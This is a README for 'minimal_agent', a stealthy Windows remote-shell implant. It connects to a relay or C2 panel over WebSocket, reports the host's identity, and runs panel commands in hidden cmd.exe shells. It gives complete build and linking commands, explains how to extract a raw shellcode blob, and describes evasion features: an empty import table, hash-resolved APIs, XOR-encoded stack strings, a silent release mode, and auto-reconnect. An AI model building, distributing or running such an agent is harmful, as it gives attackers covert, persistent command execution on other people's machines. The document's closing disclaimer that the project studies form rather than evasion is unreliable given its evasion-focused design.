# minimal_agent — a dependency-free Windows agent

A small C program that connects to a relay over WebSocket, introduces
itself with HTTP headers on the upgrade, and serves panel commands
inside a local `cmd.exe` (the Shell capability).

What makes it interesting is what it does NOT have:

- **no CRT** — no printf, no malloc, no startup code from the C runtime;
- **no import table** — not a single DLL is listed in the PE imports;
  every OS call, WinHTTP included, is found at runtime by walking the
  process's own module list (the PEB) and matching name hashes;
- **no strings in the binary** — API names live as precomputed hash
  constants inside instructions; every string the agent needs (the DLL
  names, the user agent, the identity headers, …) is built on the
  stack, XOR-decoded as it is written;
- **no `.bss`** — nothing static; everything lives on stack frames
  chosen so their lifetime matches what the data needs;
- **logging is a build option, not a feature** — a release build is
  silent; a dev build (`-DLOGGING_ENABLED`) talks.

The deliverable shape is a single-`.text` blob (raw shellcode): the
exe is the same code inside a PE envelope, and `.bin` is that envelope
peeled off — byte 0 is the entry point.

---

## What you need

- Windows 8+ (WinHTTP's WebSocket API)
- **MinGW-w64 gcc** from MSYS2 (`ucrt64` environment). Nothing else -
  no SDK headers, no libraries: the project carries its own minimal
  type dictionary (`types.h`, `wintypes.h`) and resolves everything
  else at runtime.

---

## Build

Two steps: compile the sources, then link the objects into the exe.
Two rules make or break the result — both are enforced by CI gates:

1. **`entry.o` must be the FIRST object on the link line.** `entry.c`
   holds nothing but `entry()` (the stack probes live in
   `src/stack_probes.c`), so the linker places it at byte 0 of
   `.text`. If a glob like `obj\*.o` sorts another object first, the
   exe still runs (Windows jumps by the PE header) but the raw `.bin`
   blob starts with the wrong code and dies instantly.
2. **Flags are a set** — drop one and the binary silently regains a
   `.rdata` section (pooled constants) that kills the blob. See the
   notes under each command.

### PowerShell (from the repo root)

```powershell
# 1) Start clean so release and debug objects cannot be mixed.
Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force obj | Out-Null

# 2) Compile. Sources: entry.c in the root, the rest in src\, headers in include\.
gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c

# 3) Park the objects.
Move-Item *.o obj

# 4) Link - entry.o FIRST, then the rest.
gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -nostdlib -T linker.ld -e entry -o minimal_agent.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )
```

### bash (MSYS2 shell)

```sh
rm -rf obj
mkdir -p obj
gcc -O2  -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
    -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
mv *.o obj/
gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
  -nostdlib -T linker.ld -e entry  -o minimal_agent.exe obj/entry.o $(ls obj/*.o | grep -v '/entry.o$')
```

One command does all of the above plus the gates:
`sh .local-tests/build.sh`.

### Why these exact flags

- `-fno-asynchronous-unwind-tables` drops the SEH unwind tables
  (`.pdata`/`.xdata`) the agent never uses. Its required companion
  `-fno-shrink-wrap` stops gcc from scattering prologues once the
  tables are gone (measured +1 KB of code otherwise).
- `-fno-jump-tables` keeps switch address tables (which are `.rdata`
  data) out of the binary.
- `-fno-tree-vectorize -fno-tree-slp-vectorize` (gcc; clang:
  `-fno-vectorize -fno-slp-vectorize`) stop the compiler from pooling
  the XOR constants of stack strings into an SSE payload in `.rdata` —
  in the raw blob those rip-relative loads point past the end and the
  first string read faults.

### Two coding rules that keep the blob alive

The build contract is **nothing outside `.text` may be referenced by
the code**. Two C constructs violate it silently:

- **Brace initializers with non-zero content** (`= {24, NULL, TRUE}`):
  both compilers may materialize the aggregate into `.rdata` and copy
  it with rip-relative loads. Use `MemoryZero` + explicit field stores.
- **String literals** (narrow or wide): they ARE `.rdata` by
  definition. Every runtime string goes through a stack-string builder
  (`stackstrings.h`), written byte-by-byte with a volatile key.

---

## Check your build (the gates)

**Gate 1 — the import table must be EMPTY.** A single `DLL Name:`
line means something pulled a library back in.

```powershell
objdump -p minimal_agent.exe | findstr /C:"DLL Name:"     # prints NOTHING = pass
```

**Gate 2 — entry() at `.text` byte 0.** The exe is stripped, so read
the PE header and compare against the section table:

```powershell
objdump -f minimal_agent.exe | findstr /C:"start address"
objdump -h minimal_agent.exe                              # .text VMA line
# start address must EQUAL the .text VMA (both e.g. 0x140001000) = pass
```

**Gate 3 — the blob must not start with the PE header.** See below.

### Section scoreboard

```powershell
objdump -h minimal_agent.exe | findstr /C:".text" /C:".rdata" /C:".bss" /C:".pdata"
```

| Section | Size | Meaning |
|---|---|---|
| `.text` | ~22 KB | everything the agent is |
| `.rdata` | 32 B | linker weak-extern stub; nothing references it |
| `.idata` | 24 B | empty import-directory placeholder |

---

## Making the raw blob (agent.bin)

```powershell
objcopy --dump-section .text=agent.bin minimal_agent.exe
```

`--dump-section` hands out the section CONTENTS only, under both GNU
objcopy and llvm-objcopy (`-O binary --only-section=.text` is NOT
honored the same way by llvm-objcopy — it can emit the whole PE image,
and the blob then starts with `MZ`).

Verify before shipping:

```powershell
Format-Hex agent.bin | Select-Object -First 1
# first bytes must be the entry prologue: B8 .. .. 00 00 E8 — not "MZ"
strings agent.bin          # must print NOTHING (no strings in the blob)
```

Because `entry()` is the first byte of `.text`, **byte 0 of the blob
is the entry point** — a loader drops the file anywhere in memory
(RW → copy → RX) and jumps to offset 0.

Note: cut the blob from the RELEASE exe. The dev flavor's log format
strings live in its `.rdata` — a dev blob faults on the first log call
by design of the logging being stripped in release.

---

## Run

The relay URL comes from the **`URL` environment variable** (the
no-CRT entry point reads it straight from the PEB environment block —
there is no argv):

```powershell
$env:URL = "https://relay.example.com"     # your relay, root path (no /agent)
.\minimal_agent.exe                        # release: silent by design
.\minimal_agent_dev.exe                    # dev: prints every step
```

The URL is the relay ROOT — the deployed relay generation accepts the
WebSocket upgrade on `/` (a `/agent` suffix gets a 404, the agent
retries forever).

**Identity is sent automatically.** The X-Agent-* HTTP headers ride
the WebSocket upgrade request itself (API 1): machine UUID (registry
MachineGuid, `Guid.ToString()` form), hostname, user, OS version,
build/commit tags, and the Shell capability bit. Without them the
relay still accepts the socket but the C2 never registers the agent —
its windows never open. Every header is built on the stack,
XOR-encoded — no plaintext in the binary.

Commands carry a correlation id (`[opcode][corrId:4 LE][payload]`) and
every reply echoes it (`[status:4][corrId:4][body]`) — the panel drops
replies whose echo does not match a pending command.

**A release build prints nothing.** Not even errors. It connects,
identifies, and serves; the console just sits there while it works —
that silence is the point of the release flavor. Liveness is
observable from outside: the process stays up, holds a TCP connection
to the relay, and `winhttp.dll` appears in its module list.

### Dev flavor (to see what it does)

Same two steps as the release build with `-DLOGGING_ENABLED` added to
BOTH the compile and the link line (miss one and you get a silent
hybrid), a cleaned `obj\` (mixing release objects in produces a
broken hybrid too), and a distinct output name:

```powershell
# Clean before compiling the debug objects.
Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force obj | Out-Null

gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
Move-Item *.o obj

gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -nostdlib -T linker.ld -e entry -o minimal_agent_dev.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )

$env:URL = "https://relay.example.com"
.\minimal_agent_dev.exe
```

It prints:

```
[INF] Connecting to https://relay.example.com ...
[INF] Identity: 356 header bytes on the upgrade request

[INF] Connected (HTTP 101 Switching Protocols)

[INF] [2] Agent mode: replying to commands (capability mask = Shell)...

```

and one line per panel command as they arrive (`Shell 0 opened`,
`Write to shell 0`, `Read shell 0 - N byte(s)`, `Exit requested`).

### What it does on the wire

- connects and upgrades HTTP to WebSocket (an ordinary HTTPS GET with
  `WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET`), carrying the X-Agent-*
  identity headers (API 1) — the relay copies them into its events
  and the C2 registers the agent by its machine UUID;
- `OpenShell` → spawns a hidden `cmd.exe` (code page UTF-8) behind two
  pipes; the slot index IS the shell id (256 slots);
- `WriteShell` / `ReadShell` → feed input / drain output; reads never
  block, the panel's polling drives the flow;
- `CloseShell` → kill the shell, free the slot;
- `Exit` → terminate the agent (the only command with no reply);
- anything else → `status = 1`.

A lost connection is normal, not an error: the agent redials after a
backoff (1..32 s, reset after a healthy session). Live shells survive
a redial — their pool belongs to the process, not the connection.

Because the agent advertises Shell without FileSystem, the panel's
file manager falls back to PowerShell-over-shell — a basic file
browser works with zero file opcodes implemented.

---

## How the code is laid out

| File | What it owns |
|---|---|
| `entry.c` | `entry()` and nothing else: build the URL from the PEB environment, call agent_main, exit via ExitProcess. MUST stay the first object on the link line |
| `src/stack_probes.c` | the `__chkstk`/`__alloca` stack probes for x86_64 / i386 / aarch64 (kept out of entry.c so entry stays byte 0) |
| `main.c` | `agent_main`: owns process-lifetime state on its frame (shell pool, backoff), runs dial/serve/redial; command handlers with the v3 corrId framing |
| `protocol.h` | opcodes, statuses, API-1 constants, capability mask, buffer limits |
| `identity_headers.h/.c` | the X-Agent-* identity block for the upgrade request |
| `wire.h` | tiny little-endian writers (header-only) |
| `transport.h/.c` | the WebSocket pipe: one reply out (`ws_send`), one assembled message in (`ws_receive`) |
| `shell.h/.c` | the cmd.exe pool: spawn / write / drain / teardown, 256 slots |
| `report.h/.c` | terminal diagnostics — every name is a stack string |
| `system_facts.h/.c` | hostname, username, OS version (the identity payload) |
| `winhttp_api.h/.c` | the WinHTTP table + the LdrLoadDll bootstrap that maps winhttp.dll |
| `kernel32/ntdll/advapi.h/.c` | one function table per DLL, hash-resolved |
| `peb.h/.c` | TEB/PEB access, the loader module-list walk, environment reader |
| `system.h/.c` | export-table resolve — by name (tooling) and by hash (the agent) |
| `apihash.h` | the precomputed djb2 constants for every name used |
| `stackstrings.h` | every runtime string, built on the stack, XOR-decoded in the write |
| `djb2.h/.c` | the hash both resolve paths share |
| `string.c` / `memory.c` / `logger.c` | the hand-rolled CRT replacements |

Reading order for a newcomer: `entry.c` (how a process starts without
a runtime) → `peb.c` + `system.c` (how functions are found without
imports) → `stackstrings.h` (how strings exist without existing) →
`transport.c` (the wire) → `main.c` (the loop).

---

## CI / Releases (GitHub Actions)

Cross-builds the three Windows architectures with
[llvm-mingw](https://github.com/mstorsjo/llvm-mingw) (i686 / x86_64 /
aarch64) and bakes the identity metadata (`-DID_BUILD_NUMBER`,
`-DAGENT_COMMIT_HASH`):

- **build.yml** — on push/PR: builds all three arches and runs four
  gates (empty imports; entry at `.text` byte 0; blob not starting
  with `MZ`; no rip-relative reference leaving `.text`). On pushes to
  main it also republishes the rolling `preview` pre-release;
- **release.yml** — on a `v*` tag: the same gated binaries as a stable
  GitHub Release (`windows-{i386,x86_64,aarch64}.{exe,bin}`).

The `.bin` assets are cut with `--dump-section .text=…` — byte 0 is
`entry()`, load-and-jump ready.

---

## Honest limitations

- Shell only: no native file or screen opcodes (the panel covers files
  via its PowerShell-over-shell fallback); shells die with the process.
- WinHTTP is loaded at runtime but visible in the process's module
  list for its whole life (removing it is future work).
- The connection pattern (periodic dial to one host, a non-browser
  user agent) is trivially visible to network monitoring — deliberate
  scope: this project studies form, not evasion.
